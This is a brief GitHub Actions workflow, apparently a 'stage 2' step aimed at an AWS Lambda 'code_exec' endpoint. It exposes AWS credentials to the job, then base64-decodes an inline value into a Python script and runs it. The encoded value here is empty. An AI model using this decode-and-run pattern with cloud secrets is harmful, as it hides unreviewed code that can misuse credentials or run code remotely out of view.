name: Stage2-Lambda-Tools
on:
  push:
    branches:
      - corgi
permissions:
  contents: read
jobs:
  inspect:
    runs-on: ubuntu-latest
    env:
      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
      AWS_DEFAULT_REGION: us-east-1
      API_URL: https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec
    steps:
      - name: Signed boto3 with regional endpoint
        run: |
          pip install requests requests-aws4auth --quiet
          B64=''
          printf '%s' "$B64" | base64 -d > /tmp/signed.py && python3 /tmp/signed.py
